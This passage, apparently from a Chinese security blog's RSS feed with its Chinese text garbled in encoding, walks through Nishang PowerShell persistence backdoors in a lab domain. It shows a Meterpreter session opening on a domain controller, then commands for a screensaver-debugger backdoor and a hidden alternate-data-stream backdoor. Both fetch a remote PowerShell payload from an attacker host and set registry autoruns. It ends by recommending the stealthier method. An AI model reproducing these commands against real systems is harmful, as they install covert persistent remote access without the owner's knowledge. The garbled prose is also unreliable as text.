&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.106&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: e1dpvgub&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.106&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: e1dpvgub&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Staging x64 payload &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;201308&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; https://172.16.0.107:4444 handling request from 172.16.0.106&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;UUID: e1dpvgub&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Without a database connected that payload UUID tracking will not work!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Meterpreter session &lt;span class=&#34;m&#34;&gt;48&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;172.16.0.107:4444 -&amp;gt; 127.0.0.1 &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2022-02-08 18:51:29 +0800
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;meterpreter &amp;gt; sysinfo
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Computer        : DC
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OS              : Windows 2016+ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.0 Build 14393&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Architecture    : x64
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System Language : zh_CN
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Domain          : HACK
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Logged On Users : &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Meterpreter     : x64/windows
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;2ã€Add-ScrnSaveBackdoor&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªæ˜¯éœ€è¦systemæƒé™æ‰å¯æ‰§è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Backdoors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Add-ScrnSaveBackdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Backdoors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Add-ScrnSaveBackdoor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-PayloadURL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;107&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;8000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Payload&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;added&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Debugger&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ssText3d&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;scr&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åç­‰å±å¹•ä¿æŠ¤æ‰§è¡Œå°±ä¼šå¼¹å›ä¸€ä¸ªshellï¼Œè¿™ä¸ªæµ‹è¯•æ€»æ˜¯ä¼šä¸æ–­å¼¹çª—ã€‚&lt;/p&gt;
&lt;p&gt;ä¸Šé¢ä¸¤ä¸ªåé—¨éƒ½æ˜¯ä¸å¤ªç¨³å®šçš„ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;p&gt;3ã€Invoke-ADSBackdoor&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªåé—¨è¿˜æ˜¯æ¯”è¾ƒç¨³çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Backdoors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-ADSBackdoor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Desktop&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;nishang-master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Backdoors&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-ADSBackdoor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-PayloadURL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;172.16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;107&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;800&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Update&lt;/span&gt;       &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wscript&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AppData&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;weu5hw1bnb0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;vbs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PSPath&lt;/span&gt;       &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;PowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Core&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Registry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HKEY_CURRENT_USER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Software&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CurrentVersion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Run&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PSParentPath&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;PowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Core&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Registry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HKEY_CURRENT_USER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Software&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CurrentVersion&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PSChildName&lt;/span&gt;  &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Run&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PSDrive&lt;/span&gt;      &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HKCU&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;PSProvider&lt;/span&gt;   &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;PowerShell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Core&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Registry&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;Process&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Complete&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Persistent&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;located&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;at&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HKCU&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Software&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;CurrentVersion&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Update&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ‰§è¡Œåä¼šåœ¨å¯åŠ¨é¡¹ä¸Šé¢æ·»åŠ ä¸€ä¸ªéšè—æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;C:\Users\test&amp;gt;dir /a /r
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; é©±åŠ¨å™¨ C ä¸­çš„å·æ²¡æœ‰æ ‡ç­¾ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; å·çš„åºåˆ—å·æ˜¯ B2FD-2FAE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; C:\Users\test çš„ç›®å½•
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2022/01/23  12:50    &amp;lt;DIR&amp;gt;          .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2022/01/23  12:50    &amp;lt;DIR&amp;gt;          ..
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2022/02/08  19:12    &amp;lt;DIR&amp;gt;          AppData
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                274 AppData:5obuog3ec1g.txt:$DATA
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                274 AppData:agdqfvr2ozv.txt:$DATA
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                206 AppData:eomzmbrpnjv.vbs:$DATA
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                206 AppData:weu5hw1bnb0.vbs:$DATA
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;éšç§˜æ€§å¾ˆé«˜ï¼Œæ¨èè¿™ç§åé—¨æ–¹å¼ã€‚&lt;/p&gt;
</description>
      
    </item>
    
  </channel>
</rss>